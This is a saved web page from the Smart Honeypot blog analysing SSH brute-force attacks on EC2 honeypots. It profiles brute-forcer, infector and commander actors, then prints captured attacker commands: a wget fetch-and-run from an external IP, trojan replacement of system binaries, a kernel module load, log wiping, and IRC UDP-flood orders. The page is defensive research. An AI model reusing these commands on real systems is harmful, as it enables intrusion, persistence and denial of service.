@@ -1,0 +1,698 @@
+<!doctype html>
+<!--[if !IE]>
+<html class="no-js non-ie" lang="en-US"> <![endif]-->
+<!--[if IE 7 ]>
+<html class="no-js ie7" lang="en-US"> <![endif]-->
+<!--[if IE 8 ]>
+<html class="no-js ie8" lang="en-US"> <![endif]-->
+<!--[if IE 9 ]>
+<html class="no-js ie9" lang="en-US"> <![endif]-->
+<!--[if gt IE 9]><!-->
+<html class="no-js" lang="en-US"> <!--<![endif]-->
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="http://gmpg.org/xfn/11">
+<link rel="pingback" href="https://blog.smarthoneypot.com/xmlrpc.php">
+
+<title>An in-depth analysis of SSH attacks on Amazon EC2 &#8211; Smart Honeypot Blog</title>
+<link rel="alternate" type="application/rss+xml" title="Smart Honeypot Blog &raquo; Feed" href="feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="Smart Honeypot Blog &raquo; Comments Feed" href="comments/feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="Smart Honeypot Blog &raquo; An in-depth analysis of SSH attacks on Amazon EC2 Comments Feed" href="in-depth-analysis-of-ssh-attacks-on-amazon-ec2/feed/index.html" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"https:\/\/blog.smarthoneypot.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.5.15"}};
+			!function(a,b,c){function d(a){var c,d,e,f=b.createElement("canvas"),g=f.getContext&&f.getContext("2d"),h=String.fromCharCode;if(!g||!g.fillText)return!1;switch(g.textBaseline="top",g.font="600 32px Arial",a){case"flag":return g.fillText(h(55356,56806,55356,56826),0,0),f.toDataURL().length>3e3;case"diversity":return g.fillText(h(55356,57221),0,0),c=g.getImageData(16,16,1,1).data,d=c[0]+","+c[1]+","+c[2]+","+c[3],g.fillText(h(55356,57221,55356,57343),0,0),c=g.getImageData(16,16,1,1).data,e=c[0]+","+c[1]+","+c[2]+","+c[3],d!==e;case"simple":return g.fillText(h(55357,56835),0,0),0!==g.getImageData(16,16,1,1).data[0];case"unicode8":return g.fillText(h(55356,57135),0,0),0!==g.getImageData(16,16,1,1).data[0]}return!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i;for(i=Array("simple","flag","unicode8","diversity"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='sparkling-bootstrap-css'  href='wp-content/themes/sparkling/inc/css/bootstrap.min.css%3Fver=4.5.15.css' type='text/css' media='all' />
+<link rel='stylesheet' id='sparkling-icons-css'  href='wp-content/themes/sparkling/inc/css/font-awesome.min.css%3Fver=4.5.15.css' type='text/css' media='all' />
+<link rel='stylesheet' id='sparkling-fonts-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A400italic%2C400%2C600%2C700%7CRoboto+Slab%3A400%2C300%2C700&amp;ver=4.5.15' type='text/css' media='all' />
+<link rel='stylesheet' id='sparkling-style-css'  href='wp-content/themes/sparkling/style.css%3Fver=4.5.15.css' type='text/css' media='all' />
+<link rel='stylesheet' id='fasc-buttons-style-css'  href='wp-content/plugins/forget-about-shortcode-buttons/assets/css/button-styles.css%3Fver=1.1.1.css' type='text/css' media='all' />
+<link rel='stylesheet' id='font-awesome-style-css'  href='wp-content/plugins/forget-about-shortcode-buttons/assets/css/font-awesome.min.css%3Fver=1.1.1.css' type='text/css' media='all' />
+<script type='text/javascript' src='wp-includes/js/jquery/jquery.js%3Fver=1.12.4'></script>
+<script type='text/javascript' src='wp-includes/js/jquery/jquery-migrate.min.js%3Fver=1.4.1'></script>
+<script type='text/javascript' src='wp-content/themes/sparkling/inc/js/modernizr.min.js%3Fver=4.5.15'></script>
+<script type='text/javascript' src='wp-content/themes/sparkling/inc/js/bootstrap.min.js%3Fver=4.5.15'></script>
+<script type='text/javascript' src='wp-content/themes/sparkling/inc/js/functions.min.js%3Fver=4.5.15'></script>
+<link rel='https://api.w.org/' href='wp-json/index.html' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="xmlrpc.php%3Frsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Your EC2 intance can mine a bitcoin. Well, not for you!' href='index.html%3Fp=8.html' />
+<link rel='next' title='Your Amazon EC2 attack profile changes on different geographic region' href='index.html%3Fp=87.html' />
+<meta name="generator" content="WordPress 4.5.15" />
+<link rel="canonical" href="index.html%3Fp=35.html" />
+<link rel='shortlink' href='index.html%3Fp=35.html' />
+<link rel="alternate" type="application/json+oembed" href="wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fblog.smarthoneypot.com%252Fin-depth-analysis-of-ssh-attacks-on-amazon-ec2%252F" />
+<link rel="alternate" type="text/xml+oembed" href="wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fblog.smarthoneypot.com%252Fin-depth-analysis-of-ssh-attacks-on-amazon-ec2%252F&amp;format=xml" />
+<style type="text/css">a, #infinite-handle span, #secondary .widget .post-content a {color:#0f1e31}a:hover, a:active, #secondary .widget .post-content a:hover,
+        .woocommerce nav.woocommerce-pagination ul li a:focus, .woocommerce nav.woocommerce-pagination ul li a:hover,
+        .woocommerce nav.woocommerce-pagination ul li span.current  {color: #7fa5cb;}.btn-default, .label-default, .flex-caption h2, .btn.btn-default.read-more,button,
+              .navigation .wp-pagenavi-pagination span.current,.navigation .wp-pagenavi-pagination a:hover,
+              .woocommerce a.button, .woocommerce button.button,
+              .woocommerce input.button, .woocommerce #respond input#submit.alt,
+              .woocommerce a.button, .woocommerce button.button,
+              .woocommerce a.button.alt, .woocommerce button.button.alt, .woocommerce input.button.alt { background-color: #0f1e31; border-color: #0f1e31;}.site-main [class*="navigation"] a, .more-link, .pagination>li>a, .pagination>li>span { color: #0f1e31}.btn-default:hover, .label-default[href]:hover, .tagcloud a:hover,button, .main-content [class*="navigation"] a:hover,.label-default[href]:focus, #infinite-handle span:hover,.btn.btn-default.read-more:hover, .btn-default:hover, .scroll-to-top:hover, .btn-default:focus, .btn-default:active, .btn-default.active, .site-main [class*="navigation"] a:hover, .more-link:hover, #image-navigation .nav-previous a:hover, #image-navigation .nav-next a:hover, .cfa-button:hover,.woocommerce a.button:hover, .woocommerce button.button:hover, .woocommerce input.button:hover, .woocommerce #respond input#submit.alt:hover, .woocommerce a.button:hover, .woocommerce button.button:hover, .woocommerce input.button:hover,.woocommerce a.button.alt:hover, .woocommerce button.button.alt:hover, .woocommerce input.button.alt:hover{ background-color: #7fa5cb; border-color: #7fa5cb; }.pagination>li>a:focus, .pagination>li>a:hover, .pagination>li>span:focus, .pagination>li>span:hover {color: #7fa5cb;}h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6, .entry-title {color: #425c76;}.navbar.navbar-default, .navbar-default .navbar-nav .open .dropdown-menu > li > a {background-color: #0f1e31;}#colophon {background-color: #0f1e31;}.entry-content {font-family: Open Sans; font-size:14px; font-weight: normal; color:#4f4f4f;}</style>	<style type="text/css">
+			.site-title,
+		.site-description {
+			position: absolute;
+			clip: rect(1px, 1px, 1px, 1px);
+		}
+		</style>
+	
+</head>
+
+<body class="single single-post postid-35 single-format-standard">
+<a class="sr-only sr-only-focusable" href="index.html%3Fp=35.html#content">Skip to main content</a>
+<div id="page" class="hfeed site">
+
+	<header id="masthead" class="site-header" role="banner">
+		<nav class="navbar navbar-default " role="navigation">
+			<div class="container">
+				<div class="row">
+					<div class="site-navigation-inner col-sm-12">
+						<div class="navbar-header">
+							<button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+								<span class="sr-only">Toggle navigation</span>
+								<span class="icon-bar"></span>
+								<span class="icon-bar"></span>
+								<span class="icon-bar"></span>
+							</button>
+
+							
+							<div id="logo">
+								<a href="index.html"><img src="wp-content/uploads/2015/08/smarthoneypot_blog_logo.png"  height="76" width="299" alt="Smart Honeypot Blog"/></a>
+							</div><!-- end of #logo -->
+
+							
+							
+						</div>
+						<div class="collapse navbar-collapse navbar-ex1-collapse"><ul id="menu-global" class="nav navbar-nav"><li id="menu-item-160" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-160"><a title="Smart Honeypot" href="https://www.smarthoneypot.com"><span class="glyphicon Smart Honeypot"></span>&nbsp;Home</a></li>
+<li id="menu-item-289" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-289"><a title="How it works?" href="https://www.smarthoneypot.com/#intro">How it works?</a></li>
+<li id="menu-item-288" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-288"><a title="Features" href="https://www.smarthoneypot.com/#features">Features</a></li>
+<li id="menu-item-290" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-290"><a title="Get an invitation" href="https://www.smarthoneypot.com/#plans">Get an invitation</a></li>
+</ul></div>					</div>
+				</div>
+			</div>
+		</nav><!-- .site-navigation -->
+	</header><!-- #masthead -->
+
+	<div id="content" class="site-content">
+
+		<div class="top-section">
+								</div>
+
+		<div class="container main-content-area">
+            			<div class="row pull-left">
+				<div class="main-content-inner col-sm-12 col-md-8">
+	<div id="primary" class="content-area">
+		<main id="main" class="site-main" role="main">
+
+		
+			
+<article id="post-35" class="post-35 post type-post status-publish format-standard hentry category-research category-smarthoneypot tag-aws tag-ec2 tag-honeypot">
+		<div class="post-inner-content">
+		<header class="entry-header page-header">
+
+			<h1 class="entry-title ">An in-depth analysis of SSH attacks on Amazon EC2</h1>
+
+			<div class="entry-meta">
+				<span class="posted-on"><i class="fa fa-calendar"></i> <a href="index.html%3Fp=35.html" rel="bookmark"><time class="entry-date published" datetime="2014-08-30T23:20:16+00:00">2014-08-30</time><time class="updated" datetime="2015-03-12T00:08:58+00:00">2015-03-12</time></a></span><span class="byline"> <i class="fa fa-user"></i> <span class="author vcard"><a class="url fn n" href="author/smarthoneypot/index.html">Smart Honeypot</a></span></span>
+								<span class="cat-links"><i class="fa fa-folder-open-o"></i>
+					 <a href="category/research/index.html" rel="category tag">Research</a>, <a href="category/smarthoneypot/index.html" rel="category tag">Smart Honeypot</a>				</span>
+								
+			</div><!-- .entry-meta -->
+		</header><!-- .entry-header -->
+
+		<div class="entry-content">
+			<h1>Summary</h1>
+<p>The research study investigates Secure Shell (SSH) attacks on Amazon EC2 cloud instances across different AWS zones by means of deploying Smart Honeypot (SH). It provides an in-depth analysis of SSH attacks, SSH intruders profile, and attempts to identify their tactics and purposes.</p>
+<p>Key observations for this research experiment are as following:</p>
+<ul>
+<li>Without disclosure of SH&#8217;s IP addresses, <strong>in less than 10 hours, first brute-force attempt was detected</strong>.</li>
+<li><strong>Over 89% of intruders only targeted one SH in one zone</strong>;</li>
+<li><strong>Three threat actors (attacker’s profile) were detected</strong> &#8211; brute-forcer, infector and commander &#8211; by which their source IP addresses were completely different;</li>
+<li>Typically, <strong>blacklists are limited</strong> to prevent the first threat actor i.e. brute-forcer and not the other two;</li>
+<li>Top three (3) origin country of attacks (based on whois information) were <strong>China, Russia and Egypt</strong>;</li>
+<li>Some password lists used for brute-forcing SSH service were limited to few passwords and <strong>targeted toward compromising other malicious groups infected hosts</strong>;</li>
+<li>VoIP services, network appliances and development tools account names were constantly targeted by intruders;</li>
+<li>Upon a successful password guess, <strong>a new actor (Infector) appeared to upload malicious files</strong> to SH and a connection were made to an external Command and Control server;</li>
+<li>A number of tactics were used to hide malicious executable, replace legitimate executable with infected ones and disable audit functionalities of the operating system;</li>
+<li>A third actor (Commander) employed the infected SH to <strong>conduct denial-of-service (DoS) attacks</strong>;</li>
+<li>On average intruders’ source IP address was observed for a day and there was <strong>no further connection to check the status of the infected host</strong> or re-deploy the malicious files.</li>
+</ul>
+<p><span id="more-35"></span></p>
+<h1>Introduction</h1>
+<p>Start a Cloud instance and you will be shocked with the number of &#8216;malicious&#8217; attempts against your vanilla Cloud server. Well, you may not be even aware of those if you don&#8217; monitor your network traffic, in and out of your server.</p>
+<p>Password brute-force attempt is among one of the common security attacks and adversaries are performing Internet-wide scanning, probing and penetrating of weak credentials on SSH services.</p>
+<p>As one of the use-cases for Smart Honeypot, I did a research experiment on SSH password brute-force attempts in Amazon EC2 environment to profile the adversaries and identify their tactics.</p>
+<h1>Experiment setup</h1>
+<p>The following list illustrates details of the experiment.</p>
+<ul>
+<li><strong>Number of Smart Honeypots</strong>: three (3)</li>
+<li><strong>Period of experiment</strong>: fourteen (14) days</li>
+<li><strong>Start and end dates</strong>: 7 May 2014 to 21 May 2014</li>
+<li><strong>EC2 regions</strong>: North California (US), Oregon (US), Singapore (SG)</li>
+<li><strong>Cloud instance base-image</strong>: Ubuntu 13.04 &#8211; EC2 Micro Instance</li>
+<li><strong>IP address</strong>: Default EC2 Public IP range for each zone</li>
+</ul>
+<p>For each SH, I used EC2 Micro Instance as a base which has a SSH service exposed by default. From external perspective, this resemble like a typical EC2 Micro Instance.</p>
+<p>SH is equipped with its own unique technologies and at it has not borrowed from any known honeypot solution (as argued <a title="Why should I use Smart Honeypot as oppose to a honeypot?" href="http://smarthoneypot.com/#faq">here</a> ). Additionally, the techniques that are used within SH cannot be publicly disclosed in order to hide its presences from attackers and make it ideal to profile them.</p>
+<p>No domain name was mapped to the SH public IP addresses and their addresses were not disclosed or advertised anywhere.</p>
+<p>SSH service was modified to accept authentication through username and password (i.e. keyboard based) as well as public-private keys. An additional username (i.e. git) with a weak password was created on SSH server. The super user (i.e. root)  password was also selected from a common password word-lists. Passwords on each SH were selected differently.</p>
+<p>Throughout the experiment, once an account was compromised and intruder was profiled, the password was changed to a different combination.</p>
+<p>Outgoing network traffic was actively monitored and filtered. This was a safe-guard not to allow the infrastructure to be (mis)used to target other Internet hosts</p>
+<h1>Observation</h1>
+<p>On all observations, I assume there is only one actor behind a single IP address.</p>
+<ul>
+<li>It took  less than ten (10) hours to receive a first brute-force attempt on the SH.</li>
+<li>First successful password guess happened in 5 days and the subsequent successful attempt happened in less than 2 days.</li>
+<li>91 unique successful password guesses happened during the experiment period.</li>
+<li>Three threat actors were identified during the experiment (Figure 1) in which they sourced from a unique IP address.</li>
+</ul>
+<figure id="attachment_39" class="thumbnail wp-caption aligncenter" style="width: 479px"><a href="https://blog.secdim.com/wp-content/uploads/2014/08/intruders_profile.png"><img class="wp-image-39 size-full" src="https://blog.secdim.com/wp-content/uploads/2014/08/intruders_profile.png" alt="3 actors behind all SSH attacks" width="469" height="277" /></a><figcaption class="caption wp-caption-text">Figure 1: Three (3) threat actors behind all SSH attacks</figcaption></figure>
+<h2>Brute-forcer</h2>
+<p>Brute-force (bot) attempted to brute force the target to find a correct username and password combination. As expected their behaviour was fully automated.</p>
+<ul>
+<li>Some bots attempted guessing a single username and password combination across all SHs and once unsuccessful, they move to the next password combination. This behavior was noticed since the bot IP address was observed across SHs in a short span of time (usually a few seconds);</li>
+<li>Some bots attempted to brute-force a set of username and password combination on a single SH and then moved to the next SH..</li>
+<li>Some bots used threading and initiated parallel connections to the SSH service. This behavior was noticeable as password brute-force attempt did not stop immediately after a successful guess.</li>
+<li>The majority of bots only targeted one SH. 12% of bots source IP address were observed on all the SHs while the remaining 88% only targeted one SH.</li>
+<li>The majority of bots were seen over a single day and a few over span of two days. No further activity was observed from the same source of IP address.</li>
+</ul>
+<figure id="attachment_41" class="thumbnail wp-caption aligncenter" style="width: 231px"><a href="https://blog.secdim.com/wp-content/uploads/2014/08/12_88_targetted.png"><img class="wp-image-41 size-full" src="https://blog.secdim.com/wp-content/uploads/2014/08/12_88_targetted.png" alt="Percentage of intrusion targeted all Smart Honeypots vs one Smart Honeypot" width="221" height="225" /></a><figcaption class="caption wp-caption-text">Figure 2: Percentage of intruders that target all Smart Honeypots v.s. one Smart Honeypot</figcaption></figure>
+<h3>Password lists</h3>
+<p>Some bots tried a limited set of passwords, normally less than 5 items. The password combination was not something common and it seems like they target particular servers or attempt to penetrate to other malicious groups compromised servers:</p>
+<ul>
+<li>@#$%hackin2inf3ctsiprepe@#$%</li>
+<li>darkhackerz01</li>
+<li>ullaiftw5hack</li>
+<li>t0talc0ntr0l4!</li>
+</ul>
+<p>Among password there were instances such as &#8220;shangaidc&#8221; and &#8220;lanzhon&#8221; (Chinese terms) that was initially collected on Singapore-based SH however, later on, the passwords were observed on the other zones.</p>
+<p>The majority of bots used publicly available password lists such as RockYou or 500 worst passwords lists (see <a href="https://wiki.skullsecurity.org/Passwords">https://wiki.skullsecurity.org/Passwords</a>).</p>
+<h3>Targeted user accounts</h3>
+<p>The majority of attempts were targeted on super accounts such as &#8220;root&#8221; or &#8220;admin&#8221;. The other group of highly targeted usernames were network appliances, development tools, and VoIP services::</p>
+<ul>
+<li>teamspeak (a VoIP software, popular among video game players))</li>
+<li>git, svn (code repositories for software development)</li>
+<li>nagios, vyatta (network appliances)</li>
+</ul>
+<h3>Demographic</h3>
+<p><em>Note: The reader should be reminded that the information were collected only by looking at the registration information (i.e. whois) of the intruder IP address and it should not perceived as the intrusions are orchestrated by a particular nation. A computer savvy person is aware of the fact that source IP addresses can be easily spoofed.</em></p>
+<p>The following picture demonstrate the origin country of the bot based on the IP <em>whois</em> information.</p>
+<figure id="attachment_43" class="thumbnail wp-caption aligncenter" style="width: 599px"><a href="https://blog.secdim.com/wp-content/uploads/2014/08/hp_ssh_all_map.png"><img class="wp-image-43" src="https://blog.secdim.com/wp-content/uploads/2014/08/hp_ssh_all_map.png" alt="SSH Attacks Origin Country" width="589" height="400" /></a><figcaption class="caption wp-caption-text">Figure 3: SSH attacks&#8217; origin countries (top left Singapore and right top and bottom US SHs)</figcaption></figure>
+<p>The majority of the attempts were sourced from China. Following by Russia targeting Singapore-based SH and Egypt for US-based SHs. There was no intrusion observed from Russia on US-based SH and from Egypt on Singapore-based SHs throughout the experiment.</p>
+<h2>Infector</h2>
+<p>Upon a successful brute-force attempt, bot stopped communicating with SH (only in one instance the bot continued brute-forcing however targeting a different user account) and it was interesting to observe there was no further connection from the bot&#8217;s source IP address, instead a new IP address with the correct username and password was observed to authenticate to the SSH.</p>
+<p>The new intruder, which I called it Infector, attempted to infect SH by using malicious scripts or binary files.</p>
+<p>The majority of the infectors used Secure Copy (scp) to transfer files to SH while there were instances where &#8216;wget&#8217; was used to download malicious files from an external server.</p>
+<p>Upon successful file upload, infector executed a number of commands prior and after execution of malicious files. In the example below, infector checks for the available memory on the host, checks for last logged users, changes the permission settings on the malicious script (i.e. httpd.pl) and executes it. Finally she clears the history of her commands.</p>
+<pre>"free -m",&lt;ret&gt;,"last",&lt;ret&gt;,"cd /var/tmp",&lt;ret&gt;,"chmod 777 httpd.pl",&lt;ret&gt;,"perl httpd.pl",&lt;ret&gt;,"cd",&lt;ret&gt;,"rm -rf .bash_history",&lt;ret&gt;,"history -c &amp;&amp; clear",&lt;ret&gt;,"history -c &amp;&amp; clear",&lt;ret&gt;</pre>
+<p>In another example (below), infector first checks whether the system is 64bit or 32bit, then after relaxing the malicious binary permissions, it executes the binary and puts it in the background to make sure the process is running even after logging out.</p>
+<pre>"getconf LONG_BIT",&lt;ret&gt;,&lt;^V&gt;,"chmod 0755 ./DDos32",&lt;ret&gt;,"/dev/null 2&gt;&amp;1 &amp;",&lt;ret&gt;,"nohup ./DDos32 &gt; /dev/null 2&gt;&amp;1 &amp;",&lt;ret&gt;</pre>
+<p>The above two examples were  found to be scripted or automated, however, there were few instances that the interaction seems to be manual. Infector was found to key-in the commands, frequently use ‘backspace’  key to correct the typos (see below).</p>
+<pre>bash "cd /etc",&lt;ret&gt;,"wget http://94.199.187.154/.../k.tgz; tar zxvf k.tgz ; rm -rf k.tgz;"
+,&lt;ret&gt;," cd .kde; chmod +x *; ./start.sh; ",&lt;ret&gt;," ./bleah 87.98.216.186; 
+./bleah mgx1.magex.hu; ",&lt;ret&gt;,"/sbin/service crond restart",&lt;ret&gt;,
+"service crond restart",&lt;ret&gt;,"/etc/init.d/crond restart",&lt;nl&gt;,"w",&lt;nl&gt;,
+" historye",&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,
+&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,
+&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,
+&lt;backspace&gt;,&lt;backspace&gt;,&lt;backspace&gt;,"oasswd",&lt;ret&gt;,"passwd",&lt;ret&gt;,
+"history -c",&lt;ret&gt;,"exit",&lt;ret&gt;</pre>
+<p>After deployment of the malicious files, no further interactions observed from infectors. In some instances, I even killed the malicious process, in order to see if the infector attempts to reconnect and re-deploy the malicious file.</p>
+<p>Infector used a number of techniques to hide the existence of malicious files or replace legitimate binaries with malicious equivalents. Additionally,  the infector attempted to clean her tracks by resetting the audit log file or disabling it. The following is the series of commands that infector executed on the SH where she replaced the legitimate binaries with malicious ones and attempted to load and execute a malicious kernel module.</p>
+<pre>chmod 0755 /tmp/.bash_root.tmp3
+nohup /tmp/.bash_root.tmp3
+nohup /tmp/.bash_root.tmp3
+chattr +i .bash_root.tmp3
+chattr +i /tmp/.bash_root.tmp3
+insmod /usr/lib/xpacket.ko
+ln -s /etc/init.d/DbSecuritySpt /etc/rc1.d/S97DbSecuritySpt
+ln -s /etc/init.d/DbSecuritySpt /etc/rc2.d/S97DbSecuritySpt
+ln -s /etc/init.d/DbSecuritySpt /etc/rc3.d/S97DbSecuritySpt
+ln -s /etc/init.d/DbSecuritySpt /etc/rc4.d/S97DbSecuritySpt
+ln -s /etc/init.d/DbSecuritySpt /etc/rc5.d/S97DbSecuritySpt
+mkdir -p /usr/bin/bsd-port
+cp -f /tmp/.bash_root.tmp3 /usr/bin/bsd-port/getty
+usr/bin/bsd-port/getty 
+mkdir -p /usr/bin/dpkgd
+cp -f /bin/netstat /usr/bin/dpkgd/netstat
+mkdir -p /bin
+cp -f /tmp/.bash_root.tmp3 /bin/netstat
+chmod 0755 /bin/netstat
+cp -f /bin/ps /usr/bin/dpkgd/ps
+mkdir -p /bin
+cp -f /tmp/.bash_root.tmp3 /bin/ps
+chmod 0755 /bin/ps
+cp -f /usr/bin/lsof /usr/bin/dpkgd/lsof
+mkdir -p /usr/bin
+cp -f /tmp/.bash_root.tmp3 /usr/bin/lsof
+chmod 0755 /usr/bin/lsof
+mkdir -p /usr/bin
+cp -f /tmp/.bash_root.tmp3 /usr/bin/smm
+usr/bin/smm 
+ln -s /etc/init.d/selinux /etc/rc1.d/S99selinux
+ln -s /etc/init.d/selinux /etc/rc2.d/S99selinux
+ln -s /etc/init.d/selinux /etc/rc3.d/S99selinux
+ln -s /etc/init.d/selinux /etc/rc4.d/S99selinux
+ln -s /etc/init.d/selinux /etc/rc5.d/S99selinux
+usr/bin/bsd-port/udevd 
+insmod /usr/lib/xpacket.ko
+</pre>
+<p>The following examples shows the audit logs were disabled (i.e. piped to null).</p>
+<pre>ubuntu@ip-172-31-6-109:~$ ls -l /var/log
+total 1040
+…[SNIP]…
+lrwxrwxrwx 1 root      root          9 May 20 12:26 auth.log -&gt; /dev/null
+-rw-r----- 1 syslog    adm      296097 May 18 07:24 auth.log.1
+-rw-r----- 1 syslog    adm        7095 May 14 07:32 auth.log.2.gz
+-rw-r--r-- 1 root      root       1535 May 13 14:16 boot.log
+lrwxrwxrwx 1 root      root          9 May 20 12:26 btmp -&gt; /dev/null
+-rw-r--r-- 1 syslog    adm       37823 May 13 14:16 cloud-init.log
+drwxr-xr-x 2 root      root       4096 Oct 10  2012 dist-upgrade
+…[SNIP]…
+lrwxrwxrwx 1 root      root          9 May 20 12:26 lastlog -&gt; /dev/null
+lrwxrwxrwx 1 root      root          9 May 20 09:48 messages -&gt; /dev/null
+lrwxrwxrwx 1 root      root          9 May 20 09:48 secure -&gt; /dev/null
+lrwxrwxrwx 1 root      root          9 May 20 12:26 security -&gt; /dev/null
+lrwxrwxrwx 1 root      root          9 May 20 12:26 utx.lastlogin -&gt; /dev/null
+lrwxrwxrwx 1 root      root          9 May 20 12:26 utx.log -&gt; /dev/null
+lrwxrwxrwx 1 root      root          9 May 20 12:26 wtmp -&gt; /dev/null
+lrwxrwxrwx 1 root      root          9 May 20 09:48 xferlog -&gt; /dev/null
+
+</pre>
+<p>The following is the output of <em>nestat</em> during the infection.</p>
+<pre>Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      673/sshd        
+tcp        0      0 127.0.0.1:10808         0.0.0.0:*               LISTEN      22589/.bash_root.tm
+tcp        0      0 127.0.0.1:10808         127.0.0.1:40878         ESTABLISHED 22589/.bash_root.tm
+tcp        0      0 172.31.6.109:22         60.169.77.233:4660      ESTABLISHED 23350/0         
+tcp        0      0 127.0.0.1:40878         127.0.0.1:10808         ESTABLISHED 22583/.bash_root.tm
+tcp        0     60 172.31.6.109:37806      183.57.38.250:36000     ESTABLISHED 22583/.bash_root.tm
+tcp6       0      0 :::22                   :::*                    LISTEN      673/sshd        
+udp        0      0 0.0.0.0:53              0.0.0.0:*                           19684/tinydns   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           468/dhclient3
+</pre>
+<p>And the following example shows list of files uploaded and extracted on the SH.</p>
+<pre>root@ip-172-31-6-109:~# ls -al /tmp
+total 1848
+drwxrwxrwt  4 root root    4096 May 23 01:20 .
+drwxr-xr-x 24 root root    4096 May 20 11:54 ..
+-rwxr-xr-x  1 root root 1344645 May 20 11:39 .bash_root.tmp3
+-rwxr-xr-x  1 root root  353564 May 21 12:55 .bash_root.tmp3h
+-rwxr-xr-x  1 root root       5 May 21 12:55 bill.lock
+-rw-r--r--  1 root root      69 May 22 16:03 conf.n
+-rwxr-xr-x  1 root root       5 May 21 12:55 gates.lock
+drwxr-xr-x  2 root root    4096 Apr 21 04:17 get
+-rw-r--r--  1 root root  147456 May 17 17:18 go.tar.gz
+drwx------  2 root root    4096 May 20 11:52 mc-root
+-rwxr-xr-x  1 root root       5 May 21 12:55 moni.lock
+-rw-r--r--  1 root root      72 May 21 01:51 rc.local
+-rw-r--r--  1 root root      19 May 21 01:32 resolv.conf
+</pre>
+<h2>Commander</h2>
+<p>Upon successful deployment of malicious files, in all cases, an outbound connection was initiated from the SH to a C&amp;C server.</p>
+<p>Commander, the third actor,  is a malicious entity who controls the C&amp;C server and remotely sends command to infected hosts.</p>
+<p>Figure 4 shows the IRC welcome message from one of the C&amp;C servers.</p>
+<figure id="attachment_47" class="thumbnail wp-caption alignnone" style="width: 916px"><a href="https://blog.secdim.com/wp-content/uploads/2014/08/hp_google_irc1.png"><img class="wp-image-47 size-full" src="https://blog.secdim.com/wp-content/uploads/2014/08/hp_google_irc1.png" alt="an example of C&amp;C server hosted on 5.254.116.134 (provider: Voxility)" width="906" height="527" /></a><figcaption class="caption wp-caption-text">Figure 4: an example of IRC welcome message on a C&amp;C server hosted on 5.254.116.134 (provider: Voxility)</figcaption></figure>
+<p>In most cases, C&amp;C server was IRC based and infected host joined an IRC channel and got assigned a nickname for communication with the Commander.</p>
+<p>Throughout the experiment, the infected SHs were employed to initiate DoS attacks against two  external servers:</p>
+<pre>:Gucci!Gucci@34635712.46 PRIVMSG #Support :!bot @udpflood 198.61.234.201 53 65500 60..
+:Gucci!Gucci@34635712.46 PRIVMSG #Support :!bot @udpflood 245.167.133.214 53 65500 120..</pre>
+<p>And below is the response from the infected host once task is completed</p>
+<pre>PRIVMSG #Support :.4|.12.:.3UDP DDoS.12:..4|.12 Attacking .4 198.61.234.201 53 .12 with .4 65500 .12 Kb Packets for .4 60 .12 seconds..</pre>
+<p>The attack was targeted on port 53 (DNS) for the duration of 60 seconds and 120 seconds. Please note that all outbound connections from SH were monitored and filtered in order to prevent any possible harm to external servers.</p>
+<p>That&#8217;s all for now. There are still other interesting points that I am investigating and will cover them in the future posts.</p>
+<h2>How to protect yourself against SSH attacks</h2>
+<p>Three (3) tips that can strongly improve the security posture of your SSH service (there are lots other things your can do but these three will help the most):</p>
+<ol>
+<li>Be cautious of running blacklisting software such as Fail2ban. You may crash your own server (more details <a title="Fail2ban" href="https://wiki.archlinux.org/index.php/fail2ban">https://wiki.archlinux.org/index.php/fail2ban</a>). Instead whitelist the access to the SSH service, if not possible, use an external blacklist feed to block intruders. Remember, if you use a generic blacklist feed, on average, it blocks 12% of your actual intruders;</li>
